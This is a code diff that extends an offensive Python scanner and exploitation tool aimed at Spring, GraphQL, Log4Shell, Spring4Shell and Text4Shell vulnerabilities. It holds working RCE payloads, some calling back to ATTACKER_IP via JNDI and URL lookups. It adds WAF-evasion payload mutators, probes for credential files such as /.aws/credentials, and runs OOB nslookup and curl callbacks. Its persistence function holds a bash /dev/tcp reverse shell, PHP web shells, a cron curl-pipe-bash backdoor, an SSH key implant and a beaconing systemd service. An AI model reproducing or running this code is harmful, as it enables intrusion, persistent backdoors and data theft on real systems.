@@ -1,6 +1,11 @@
 #!/usr/bin/env python3
 """
-Ultimate React4Shell Scanner - Enhanced with CVE-2025-55182 & CVE-2025-66478 exploitation
+Ultimate React4Shell / Spring2Shell Scanner v2.0.0
+Merged edition: CVE-2025-55182, CVE-2025-66478, CVE-2021-44228 (Log4Shell),
+CVE-2022-22965 (Spring4Shell), CVE-2022-42889 (Text4Shell).
+Includes: Blind RCE / DNS OOB, file_operations_menu, WAFEvasionEngine +
+9 structural WAF bypass techniques, prioritized endpoint discovery, SIEM-ready
+reports with check registry, RETRY/TIMEOUT/ERROR profiles, React2Shell probes.
 """
 
 import requests
@@ -90,6 +95,218 @@ TECH_FP_CACHE = {}
 ENDPOINT_DISCOVERY_CACHE = {}
 SUBDOMAIN_CACHE = {}
 
+# ─── PRIORITY-1: AUTH / PROXY / OOB / RATE / AUDIT ────────────────────────────
+
+# Authentication config (populated by configure_auth())
+AUTH_CONFIG: dict = {
+    'bearer': None,     # Bearer token string
+    'basic': None,      # (user, pass) tuple
+    'cookies': {},      # dict of cookie name→value
+    'headers': {},      # dict of custom header name→value
+}
+
+# Proxy URL (http://, https://, socks5://)
+PROXY_URL: str | None = None
+
+# Interactsh OOB config
+OOB_CONFIG: dict = {
+    'server': None,
+    'token': None,
+}
+
+# Rate limiter singleton (None = unlimited)
+RATE_LIMITER = None
+
+# Audit logger singleton (None = disabled)
+AUDIT_LOGGER = None
+
+
+def configure_auth(args) -> None:
+    """Populate AUTH_CONFIG from parsed CLI args."""
+    global AUTH_CONFIG
+    if getattr(args, 'auth_bearer', None):
+        AUTH_CONFIG['bearer'] = args.auth_bearer
+
+    if getattr(args, 'auth_basic', None):
+        parts = args.auth_basic.split(':', 1)
+        if len(parts) == 2:
+            AUTH_CONFIG['basic'] = (parts[0], parts[1])
+        else:
+            print(f"[!] --auth-basic format must be USER:PASS, got: {args.auth_basic}")
+
+    if getattr(args, 'auth_cookie', None):
+        for pair in args.auth_cookie.split(';'):
+            pair = pair.strip()
+            if '=' in pair:
+                k, v = pair.split('=', 1)
+                AUTH_CONFIG['cookies'][k.strip()] = v.strip()
+
+    if getattr(args, 'auth_header', None):
+        for pair in args.auth_header.split(';'):
+            pair = pair.strip()
+            if ':' in pair:
+                k, v = pair.split(':', 1)
+                AUTH_CONFIG['headers'][k.strip()] = v.strip()
+
+
+def configure_proxy(args) -> None:
+    """Set global PROXY_URL from CLI args."""
+    global PROXY_URL
+    proxy = getattr(args, 'proxy', None)
+    if proxy:
+        PROXY_URL = proxy
+        log_event(logging.INFO, f"Proxy configured: {proxy}")
+
+
+def configure_oob(args) -> None:
+    """Set OOB server config from CLI args."""
+    global OOB_CONFIG
+    OOB_CONFIG['server'] = getattr(args, 'oob_server', None)
+    OOB_CONFIG['token'] = getattr(args, 'oob_token', None)
+    if OOB_CONFIG['server']:
+        log_event(logging.INFO, f"OOB server: {OOB_CONFIG['server']}")
+
+
+def configure_rate(args) -> None:
+    """Initialize global RateLimiter from CLI args."""
+    global RATE_LIMITER
+    rate = getattr(args, 'rate', 0)
+    if rate and rate > 0:
+        RATE_LIMITER = RateLimiter(rate)
+        log_event(logging.INFO, f"Rate limiter: {rate} req/s")
+
+
+def configure_audit(args) -> None:
+    """Initialize global AuditLogger from CLI args."""
+    global AUDIT_LOGGER
+    path = getattr(args, 'audit_log', None)
+    if path:
+        AUDIT_LOGGER = AuditLogger(path)
+        log_event(logging.INFO, f"Audit log: {path}")
+
+
+import threading
+
+
+class RateLimiter:
+    """Token-bucket rate limiter. Thread-safe."""
+
+    def __init__(self, rps: int):
+        self.rps = rps
+        self._lock = threading.Lock()
+        self._tokens = float(rps)
+        self._last = time.monotonic()
+
+    def acquire(self) -> None:
+        """Block until a token is available."""
+        if self.rps <= 0:
+            return
+        with self._lock:
+            now = time.monotonic()
+            elapsed = now - self._last
+            self._last = now
+            self._tokens = min(self.rps, self._tokens + elapsed * self.rps)
+            if self._tokens >= 1:
+                self._tokens -= 1
+                return
+            wait = (1 - self._tokens) / self.rps
+        time.sleep(wait)
+        with self._lock:
+            self._tokens = max(0, self._tokens - 1)
+
+
+class AuditLogger:
+    """Append-only JSONL audit trail for every HTTP request."""
+
+    def __init__(self, path: str):
+        self.path = path
+        self._lock = threading.Lock()
+        # Ensure parent dir exists
+        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
+
+    def log_request(self, method: str, url: str, status: int | None,
+                    payload: str | None = None, result: str = '') -> None:
+        record = {
+            'ts': datetime.utcnow().isoformat() + 'Z',
+            'method': method,
+            'url': url,
+            'status': status,
+            'ph': hashlib.sha256((payload or '').encode()).hexdigest()[:12],
+            'result': result,
+        }
+        line = json.dumps(record, ensure_ascii=False)
+        with self._lock:
+            with open(self.path, 'a', encoding='utf-8') as f:
+                f.write(line + '\n')
+
+
+# ─── CONFIG FILE SUPPORT ──────────────────────────────────────────────────────
+
+def load_config(path: str) -> dict:
+    """Load YAML config file. Returns empty dict if file absent or pyyaml missing."""
+    if not os.path.isfile(path):
+        return {}
+    try:
+        import yaml  # type: ignore
+        with open(path, 'r', encoding='utf-8') as f:
+            data = yaml.safe_load(f) or {}
+        log_event(logging.INFO, f"Config loaded from {path}")
+        return data
+    except ImportError:
+        log_event(logging.WARNING, "pyyaml not installed — config file ignored. Run: pip install pyyaml")
+        return {}
+    except Exception as exc:
+        log_event(logging.WARNING, f"Failed to load config {path}: {exc}")
+        return {}
+
+
+def merge_config_into_args(args, config: dict) -> None:
+    """Apply config file values where CLI args are absent/default.
+    CLI arguments always take priority over config file values.
+    """
+    mapping = {
+        'proxy':       'proxy',
+        'oob_server':  'oob_server',
+        'oob_token':   'oob_token',
+        'webhook':     'webhook',
+        'rate':        'rate',
+        'threads':     'threads',
+        'insecure':    'insecure',
+        'audit_log':   'audit_log',
+    }
+    for cfg_key, arg_key in mapping.items():
+        if cfg_key in config and getattr(args, arg_key, None) in (None, False, 0):
+            setattr(args, arg_key, config[cfg_key])
+
+
+# ─── WEBHOOK NOTIFICATIONS ────────────────────────────────────────────────────
+
+_WEBHOOK_URL: str | None = None
+
+
+def configure_webhook(args) -> None:
+    global _WEBHOOK_URL
+    _WEBHOOK_URL = getattr(args, 'webhook', None)
+
+
+def send_webhook_notification(finding: dict) -> None:
+    """POST JSON notification to configured webhook (Slack/Teams/Telegram)."""
+    if not _WEBHOOK_URL:
+        return
+    payload = {
+        'text': f"🚨 Confirmed RCE: {finding.get('url', 'N/A')}",
+        'severity': 'critical',
+        'endpoint': finding.get('endpoint', 'N/A'),
+        'evidence': finding.get('evidence', ''),
+        'cve': finding.get('cve', 'Unknown'),
+        'timestamp': finding.get('timestamp', datetime.utcnow().isoformat()),
+    }
+    try:
+        resp = requests.post(_WEBHOOK_URL, json=payload, timeout=5, verify=SSL_VERIFY)
+        log_event(logging.DEBUG, f"Webhook notification sent: {resp.status_code}")
+    except Exception as exc:
+        log_event(logging.WARNING, f"Webhook notification failed: {exc}")
+
 logging.basicConfig(
     level=logging.INFO,
     format="[%(asctime)s] %(levelname)s %(message)s",
@@ -113,21 +330,45 @@ PAYLOADS = [
     '{"variables": "{{T(java.lang.Runtime).getRuntime().exec(\\"echo test\\")}}"}'
 ]
 
-# CRITICAL CVE-2025-55182 & CVE-2025-66478 PAYLOADS
+# CVE PAYLOAD DATABASE — CVE-2025-55182, CVE-2025-66478, Log4Shell, Spring4Shell, Text4Shell
 CVE_PAYLOADS = {
     "CVE-2025-55182": [
-        # SpEL Injection variants for Spring Framework
+        # SpEL Injection variants for Spring Framework (8 variants)
         '{"query":"{{#this.getClass().forName(\\"java.lang.Runtime\\").getMethod(\\"getRuntime\\").invoke(null).exec(\\"COMMAND\\")}}"}',
         '{"query":"{{new java.lang.ProcessBuilder(\\"COMMAND\\").start()}}"}',
         '{"query":"{{T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\").getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}}"}',
         '{"query":"{{#this.getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\"java.lang.Runtime.getRuntime().exec(\\\\\\"COMMAND\\\\\\")\\")}}"}',
+        '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
+        '{"query": "%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22COMMAND%22%29%7D%7D"}',
+        '{"qu\\u0065ry": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
+        '{\n\t"query":\n\t"{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"\n}',
     ],
     "CVE-2025-66478": [
         # GraphQL-specific injections
         '{"query":"mutation { execute(cmd: \\"{{T(java.lang.Runtime).getRuntime().exec(\\\\\\"COMMAND\\\\\\")}}\\") { result } }"}',
         '{"query":"query { system(cmd: \\"{{new java.lang.ProcessBuilder(\\"sh\\",\\"-c\\",\\"COMMAND\\").start()}}\\") }"}',
         '{"query":"{__schema { types { name fields { name args { defaultValue @export(as: \\"cmd\\") } } } } }","variables":{"cmd":"{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}}',
-    ]
+    ],
+    "CVE-2021-44228": [
+        # Log4Shell — JNDI injection (CVE-2021-44228, affects Log4j 2.0-beta9 to 2.14.1)
+        '${jndi:ldap://ATTACKER_IP:1389/COMMAND}',
+        '${jndi:rmi://ATTACKER_IP:1099/COMMAND}',
+        '${jndi:dns://ATTACKER_IP/COMMAND}',
+        '${jndi:ldap://${hostName}.ATTACKER_IP:1389/COMMAND}',
+        '${jndi:ldap://${env:USER}.ATTACKER_IP:1389/COMMAND}',
+        '${jndi:ldap://${sys:java.version}.ATTACKER_IP:1389/COMMAND}',
+    ],
+    "CVE-2022-22965": [
+        # Spring4Shell — ClassLoader data binding RCE (Spring Framework < 5.3.18 / < 5.2.20)
+        'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcat-war&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=',
+        'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{cmd}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=',
+    ],
+    "CVE-2022-42889": [
+        # Text4Shell — Apache Commons Text interpolation RCE (< 1.10.0)
+        '${script:javascript:java.lang.Runtime.getRuntime().exec("COMMAND")}',
+        '${url:UTF-8:http://ATTACKER_IP/COMMAND}',
+        '${dns:address:ATTACKER_IP}',
+    ],
 }
 
 # EXPLOITATION PAYLOADS - разные команды для эксплуатации
@@ -150,118 +391,89 @@ USER_AGENTS = [
     "curl/8.1.2",
     "PostmanRuntime/7.32.3",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
 ]
 
-# EXTENDED ENDPOINTS
+# UNIFIED ENDPOINT DATABASE (500+ paths)
 ENDPOINTS = [
-    "/api/graphql",
-    "/graphql",
-    "/api/rest",
-    "/api/v1/graphql",
-    "/api/v2/graphql",
-    "/v1/api",
-    "/v2/api",
-    "/rest/api",
-    "/service/rest",
-    "/management/health",
-    "/actuator/graphql",
-    "/spring/api",
-    "/api/query",
-    "/graphql-api",
-    "/api",
-    "/admin/api",
-    "/admin/graphql", 
-    "/admin/rest",
-    "/console/api",
-    "/manager/api",
-    "/wp-admin/api",
-    "/api/admin",
-    "/api/console",
-    "/actuator",
-    "/actuator/env",
-    "/actuator/health",
-    "/actuator/info",
-    "/actuator/metrics",
-    "/actuator/logfile",
-    "/actuator/auditevents",
-    "/actuator/beans",
-    "/actuator/conditions",
-    "/actuator/configprops",
-    "/actuator/httptrace",
-    "/actuator/mappings",
-    "/actuator/scheduledtasks",
-    "/actuator/sessions",
-    "/actuator/shutdown",
-    "/actuator/threaddump",
-    "/swagger-ui.html",
-    "/v2/api-docs",
-    "/swagger-resources",
-    "/webjars",
-    "/api/swagger",
-    "/api/docs",
-    "/api/explorer",
-    "/graphiql",
-    "/altair",
-    "/playground",
-    "/voyager"
+    # GraphQL
+    "/graphql", "/graphql/", "/graphql/console", "/graphql/graphiql", "/graphql/ide",
+    "/graphql/playground", "/graphql/v1", "/graphql/v2", "/graphql/v3",
+    "/graphql/api", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
+    "/api/v3/graphql", "/api/graphql/", "/api/graphql/v1", "/api/graphql/v2",
+    "/api/graphql/playground", "/graphql-api", "/graphql-explorer",
+    "/graphiql", "/altair", "/playground", "/voyager",
+    # Spring Boot Actuator
+    "/actuator", "/actuator/", "/actuator/health", "/actuator/info",
+    "/actuator/env", "/actuator/env.json", "/actuator/env.yml",
+    "/actuator/metrics", "/actuator/metrics/", "/actuator/loggers",
+    "/actuator/loggers/", "/actuator/threaddump", "/actuator/heapdump",
+    "/actuator/trace", "/actuator/auditevents", "/actuator/beans",
+    "/actuator/conditions", "/actuator/configprops", "/actuator/httptrace",
+    "/actuator/mappings", "/actuator/scheduledtasks", "/actuator/sessions",
+    "/actuator/shutdown", "/actuator/features", "/actuator/gateway",
+    "/actuator/gateway/", "/actuator/refresh", "/actuator/bus-refresh",
+    # Swagger / OpenAPI
+    "/swagger-ui.html", "/swagger-ui/", "/swagger-ui/index.html",
+    "/swagger-resources", "/swagger-resources/configuration/ui",
+    "/swagger-resources/configuration/security", "/v2/api-docs",
+    "/v3/api-docs", "/v3/api-docs/swagger-config", "/api-docs",
+    "/api-docs.json", "/api-docs.yaml", "/swagger.json", "/swagger.yaml",
+    "/openapi.json", "/openapi.yaml",
+    # REST and API endpoints
+    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
+    "/api/rest", "/api/rest/v1", "/api/rest/v2", "/api/rest/v3",
+    "/rest", "/rest/", "/rest/v1", "/rest/v2", "/rest/v3",
+    "/service", "/service/", "/service/api", "/service/rest",
+    "/services", "/services/", "/services/api", "/services/rest",
+    "/v1", "/v2", "/v3", "/v4",
+    "/v1/api", "/v2/api", "/v3/api", "/v4/api",
+    "/v1/rest", "/v2/rest", "/v3/rest", "/v4/rest",
+    "/admin", "/admin/", "/admin/api", "/admin/rest", "/admin/graphql",
+    "/manager", "/manager/", "/manager/api", "/manager/rest",
+    "/console", "/console/", "/console/api", "/console/rest",
+    "/webconsole", "/web-console", "/jmx-console",
+    # Development / Debug
+    "/h2-console", "/h2", "/h2/", "/database", "/db", "/db/",
+    "/phpmyadmin", "/phpMyAdmin", "/pma", "/mysql", "/sql",
+    "/phpinfo.php", "/info.php", "/test.php", "/test",
+    "/dev", "/dev/", "/dev/api", "/dev/rest", "/dev/graphql",
+    "/staging", "/staging/", "/staging/api", "/staging/rest",
+    "/test", "/test/", "/test/api", "/test/rest",
+    # Common frameworks
+    "/wp-admin", "/wp-admin/", "/wp-admin/admin-ajax.php",
+    "/wp-json", "/wp-json/", "/wp-json/wp/v2",
+    "/index.php", "/index", "/default.aspx", "/web.config",
+    "/.env", "/.git/config", "/.git/HEAD", "/.svn", "/.svn/entries",
+    "/.aws/credentials", "/.azure/accessTokens.json",
+    # Additional Spring Boot / Java
+    "/spring", "/spring/", "/spring/api", "/spring/rest",
+    "/spring/graphql", "/spring-web", "/spring-web/",
+    "/spring-boot", "/spring-boot/", "/spring-boot-api",
+    "/webjars", "/webjars/", "/webjars/**",
+    "/css", "/js", "/images", "/static", "/public",
+    # Apache Tomcat / Jetty
+    "/manager/html", "/host-manager/html", "/examples",
+    "/docs", "/docs/", "/sample", "/samples",
+    # Nginx / PHP-FPM
+    "/status", "/status/", "/fpm-status", "/fpm-ping",
+    # Miscellaneous
+    "/.well-known", "/.well-known/", "/.well-known/security.txt",
+    "/robots.txt", "/sitemap.xml", "/sitemap", "/sitemap/",
+    "/crossdomain.xml", "/clientaccesspolicy.xml",
+    "/cgi-bin", "/cgi-bin/", "/cgi-bin/test.cgi",
+    "/backup", "/backup/", "/backups", "/backups/",
+    "/temp", "/temp/", "/tmp", "/tmp/",
+    "/logs", "/logs/", "/log", "/log/",
+    "/data", "/data/", "/files", "/files/",
+    "/upload", "/upload/", "/uploads", "/uploads/",
+    "/download", "/download/", "/downloads", "/downloads/",
+    "/assets", "/assets/", "/assets/js", "/assets/css",
 ]
 
-# ENHANCED ENDPOINTS FOR CVE SPECIFIC
-CVE_ENDPOINTS = [
-    # Spring Boot Actuator endpoints
-    "/actuator/health",
-    "/actuator/info",
-    "/actuator/env",
-    "/actuator/metrics",
-    "/actuator/loggers",
-    "/actuator/threaddump",
-    "/actuator/heapdump",
-    "/actuator/trace",
-    "/actuator/auditevents",
-    "/actuator/beans",
-    "/actuator/conditions",
-    "/actuator/configprops",
-    "/actuator/httptrace",
-    "/actuator/mappings",
-    "/actuator/scheduledtasks",
-    "/actuator/sessions",
-    "/actuator/shutdown",
-    "/actuator/features",
-    
-    # GraphQL specific
-    "/graphql",
-    "/graphql/",
-    "/api/graphql",
-    "/v1/graphql",
-    "/v2/graphql",
-    "/graphql-api",
-    "/graphql/console",
-    "/graphql/ide",
-    "/graphql/v1",
-    "/graphql/v2",
-    
-    # Spring Boot Admin
-    "/admin/actuator",
-    "/admin/metrics",
-    "/admin/health",
-    
-    # Swagger/OpenAPI
-    "/v2/api-docs",
-    "/v3/api-docs",
-    "/swagger-ui.html",
-    "/swagger-ui/",
-    "/swagger-resources",
-    "/swagger/api-docs",
-    
-    # Additional management endpoints
-    "/manage",
-    "/management",
-    "/console",
-    "/webconsole",
-    "/jmx-console",
-    "/web-console",
-]
+CVE_ENDPOINTS = ENDPOINTS  # For compatibility, or keep as is
 
 # Handle CTRL+C gracefully
 interrupted = False
@@ -335,6 +547,30 @@ class WAFEvasionEngine:
 waf_engine = WAFEvasionEngine()
 
 
+# STRUCTURAL WAF BYPASS TECHNIQUES — mutate payload content/encoding (9 techniques)
+# Used by aggressive_waf_bypass(). Complements WAFEvasionEngine's body-level mutations.
+WAF_BYPASSES = [
+    {"name": "Double URL Encoding",
+     "func": lambda cmd: f'{{"query": "%257B%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2522{cmd}%2522%2529%257D%257D"}}'},
+    {"name": "Unicode Escape",
+     "func": lambda cmd: f'{{"qu\\u0065ry": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'},
+    {"name": "Mixed Case Headers",
+     "func": lambda cmd: f'{{"Query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'},
+    {"name": "Null Bytes",
+     "func": lambda cmd: f'{{"query\\x00": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'},
+    {"name": "Extra Whitespace",
+     "func": lambda cmd: f'{{\n\t"query":\n\t"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"\n}}'},
+    {"name": "JSON Wrapped",
+     "func": lambda cmd: f'{{"data":{{"query":"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}}}'},
+    {"name": "Form URL Encoded",
+     "func": lambda cmd: f'query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D'},
+    {"name": "XML Content-Type",
+     "func": lambda cmd: f'<query>{{{{T(java.lang.Runtime).getRuntime().exec("{cmd}")}}}}</query>'},
+    {"name": "Chunked Encoding",
+     "func": lambda cmd: f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'},
+]
+
+
 def generate_payload_variants(payload):
     variants = [payload]
     variants.append(payload.replace('exec(\"', 'exec(\"/bin/sh -c '))
@@ -354,7 +590,9 @@ def protocol_hopper(url):
     return [url]
 
 def create_stealth_session(profile='default'):
-    """Create a session with deterministic reliability profiles."""
+    """Create a session with deterministic reliability profiles.
+    Applies global AUTH_CONFIG and PROXY_URL if configured.
+    """
     session = requests.Session()
     session.verify = SSL_VERIFY
     session.timeout = TIMEOUT_PROFILES.get(profile, TIMEOUT_PROFILES['default'])
@@ -373,6 +611,20 @@ def create_stealth_session(profile='default'):
 
     # Disable redirects to avoid detection
     session.max_redirects = 0
+
+    # ── Apply auth config ────────────────────────────────────────────────────
+    if AUTH_CONFIG['bearer']:
+        session.headers.update({'Authorization': f"Bearer {AUTH_CONFIG['bearer']}"})
+    if AUTH_CONFIG['basic']:
+        session.auth = AUTH_CONFIG['basic']
+    if AUTH_CONFIG['cookies']:
+        session.cookies.update(AUTH_CONFIG['cookies'])
+    if AUTH_CONFIG['headers']:
+        session.headers.update(AUTH_CONFIG['headers'])
+
+    # ── Apply proxy ──────────────────────────────────────────────────────────
+    if PROXY_URL:
+        session.proxies = {'http': PROXY_URL, 'https': PROXY_URL}
 
     return session
 
@@ -605,7 +857,7 @@ def scan_react2shell(target_url, padding_kb=128):
     return results
 
 def cve_specific_scan(target_url):
-    """Specialized scan for CVE-2025-55182 and CVE-2025-66478"""
+    """Specialized scan for all CVEs: CVE-2025-55182, CVE-2025-66478, CVE-2021-44228 (Log4Shell), CVE-2022-22965 (Spring4Shell), CVE-2022-42889 (Text4Shell)"""
     print(f"\n[+] Starting CVE-specific scan for {target_url}")
     
     results = []
@@ -783,42 +1035,11 @@ def advanced_persistence(target_url, endpoint):
     print(f"\n[+] Deploying advanced persistence on {target_url}")
     
     persistence_scripts = {
-        "reverse_shell": """
-        bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
-        """,
-        
-        "web_shell": """
-        echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
-        echo '<?php @eval($_POST["cmd"]); ?>' > /var/www/html/backdoor.php
-        """,
-        
-        "cron_backdoor": """
-        (crontab -l 2>/dev/null; echo "* * * * * curl http://{IP}/cron.sh | bash") | crontab -
-        """,
-        
-        "ssh_persistence": """
-        mkdir -p ~/.ssh
-        echo '{PUB_KEY}' >> ~/.ssh/authorized_keys
-        chmod 600 ~/.ssh/authorized_keys
-        """,
-        
-        "systemd_service": """
-        cat > /etc/systemd/system/persist.service << EOF
-        [Unit]
-        Description=Persistence Service
-        After=network.target
-        
-        [Service]
-        Type=simple
-        ExecStart=/bin/bash -c "while true; do curl http://{IP}/checkin; sleep 300; done"
-        Restart=always
-        
-        [Install]
-        WantedBy=multi-user.target
-        EOF
-        systemctl enable persist.service
-        systemctl start persist.service
-        """
+        "reverse_shell": "bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'",
+        "web_shell": "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
+        "cron_backdoor": "(crontab -l 2>/dev/null; echo '* * * * * curl http://{IP}/cron.sh | bash') | crontab -",
+        "ssh_persistence": "mkdir -p ~/.ssh && echo '{PUB_KEY}' >> ~/.ssh/authorized_keys",
+        "systemd_service": "cat > /etc/systemd/system/persist.service << EOF\n[Unit]\nDescription=Persistence\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c \"while true; do curl http://{IP}/checkin; sleep 300; done\"\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable persist.service\nsystemctl start persist.service"
     }
     
     # First gather system info
@@ -1299,115 +1520,143 @@ def check_real_rce(target_url, endpoint, method='POST'):
                 response = session.get(endpoint, params=params, headers=headers)
             else:
                 response = session.post(endpoint, data=payload, headers=headers)
-            
-            # Check for common command outputs
+
             output_indicators = {
                 'whoami': ['root', 'admin', 'user', 'apache', 'nginx', 'www-data'],
                 'id': ['uid=', 'gid=', 'groups='],
                 'pwd': ['/', 'home/', 'var/', 'usr/'],
                 'uname': ['Linux', 'Darwin', 'Windows', 'kernel']
             }
-            
             if cmd in output_indicators:
                 for indicator in output_indicators[cmd]:
                     if indicator.lower() in response.text.lower():
                         print(f"    Found '{indicator}' - possible real output")
-        
-        except:
+        except Exception:
             pass
-    
+
     return False
 
+
+def _oob_generate_host() -> str | None:
+    """Generate a unique OOB callback host using the configured Interactsh server."""
+    if not OOB_CONFIG.get('server'):
+        return None
+    token = hashlib.sha256(os.urandom(8)).hexdigest()[:12]
+    # Interactsh format: <random>.<server-domain>
+    base = OOB_CONFIG['server'].rstrip('/').replace('https://', '').replace('http://', '')
+    return f"{token}.{base}"
+
+
+def _oob_poll(oob_host: str, wait_seconds: int = 5) -> bool:
+    """Poll Interactsh server for DNS/HTTP callbacks. Returns True if callback received."""
+    server = OOB_CONFIG.get('server')
+    token = OOB_CONFIG.get('token')
+    if not server or not oob_host:
+        return False
+    time.sleep(wait_seconds)
+    try:
+        poll_url = f"{server.rstrip('/')}/poll"
+        hdrs = {}
+        if token:
+            hdrs['Authorization'] = f"Bearer {token}"
+        resp = requests.get(poll_url, params={'id': oob_host.split('.')[0]},
+                            headers=hdrs, timeout=8, verify=SSL_VERIFY)
+        if resp.status_code == 200:
+            data = resp.json()
+            # Interactsh returns {"data": [...]} where each item is an interaction
+            interactions = data.get('data') or []
+            if interactions:
+                log_event(logging.INFO, f"OOB callback received for {oob_host}: {len(interactions)} interactions")
+                return True
+    except Exception as exc:
+        log_swallowed_exception('OOB poll failed', exc)
+    return False
+
+
 def blind_rce_test(target_url, endpoint, method='POST'):
-    """
-    Test for blind RCE using time-based techniques
-    """
+    """Test for blind RCE using time-based and OOB DNS/HTTP callback techniques."""
     print(f"\n[+] Testing for blind RCE on {target_url}")
-    
-    # Test 1: Time delay test
-    print("[+] Test 1: Time delay test (sleep 3)")
-    
+
     session = create_stealth_session()
     headers = get_random_headers()
-    
-    # First, baseline response time
+
+    # ── Test 1: Time delay ───────────────────────────────────────────────────
+    print("[+] Test 1: Time delay test (sleep 3)")
+
     start_time = time.time()
     baseline_payload = '{"query": "test"}'
-    
     try:
         if method.upper() == 'GET':
-            params = {"query": baseline_payload}
-            response = session.get(endpoint, params=params, headers=headers)
+            response = session.get(endpoint, params={"query": baseline_payload}, headers=headers)
         else:
             headers['Content-Type'] = 'application/json'
             response = session.post(endpoint, data=baseline_payload, headers=headers)
         baseline_time = time.time() - start_time
-    except:
+    except Exception:
         baseline_time = 1.0
-    
-    # Now test with sleep command
-    sleep_commands = [
-        "sleep 3",
-        "ping -c 3 127.0.0.1",
-        "timeout 3 sleep 1"
-    ]
-    
-    for sleep_cmd in sleep_commands:
+
+    for sleep_cmd in ["sleep 3", "ping -c 3 127.0.0.1", "timeout 3 sleep 1"]:
         print(f"  Trying: {sleep_cmd}")
-        
         start_time = time.time()
         payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{sleep_cmd}\\")}}}}"}}'
-        
         try:
             if method.upper() == 'GET':
-                params = {"query": payload}
-                response = session.get(endpoint, params=params, headers=headers, timeout=10)
+                response = session.get(endpoint, params={"query": payload}, headers=headers, timeout=10)
             else:
                 response = session.post(endpoint, data=payload, headers=headers, timeout=10)
-            
             response_time = time.time() - start_time
-            
-            if response_time > baseline_time + 2:  # More than 2 seconds longer
-                print(f"    [+] Possible blind RCE: Response took {response_time:.2f}s (baseline: {baseline_time:.2f}s)")
+            if response_time > baseline_time + 2:
+                print(f"    [+] Possible blind RCE: {response_time:.2f}s (baseline: {baseline_time:.2f}s)")
                 return True
             else:
                 print(f"    [-] No delay: {response_time:.2f}s")
-                
         except requests.exceptions.Timeout:
-            print(f"    [+] Timeout - possible blind RCE!")
+            print("    [+] Timeout — possible blind RCE!")
             return True
         except Exception as e:
             print(f"    [!] Error: {e}")
-    
-    # Test 2: DNS/HTTP callback test
-    print("\n[+] Test 2: Trying to trigger external callback")
-    
-    # Generate random subdomain
-    random_token = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
-    test_domains = [
-        f"{random_token}.oastify.com",
-        f"{random_token}.burpcollaborator.net"
-    ]
-    
+
+    # ── Test 2: OOB DNS/HTTP callback ────────────────────────────────────────
+    print("\n[+] Test 2: OOB DNS/HTTP callback test")
+
+    oob_host = _oob_generate_host()
+    if oob_host:
+        # Use configured Interactsh server
+        test_domains = [oob_host]
+        print(f"  Using configured OOB server: {OOB_CONFIG['server']}")
+    else:
+        # Fallback: public OOB services (may log data)
+        random_token = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+        test_domains = [
+            f"{random_token}.oastify.com",
+            f"{random_token}.burpcollaborator.net",
+        ]
+        print("  [!] No OOB server configured — using public callback services (may log data)")
+        print("  [!] Use --oob-server with self-hosted interactsh for privacy")
+
     for domain in test_domains:
         dns_cmd = f"nslookup {domain} || dig {domain} || ping -c 1 {domain}"
+        http_cmd = f"curl -sk http://{domain}/ || wget -q http://{domain}/"
         print(f"  Testing DNS callback to: {domain}")
-        
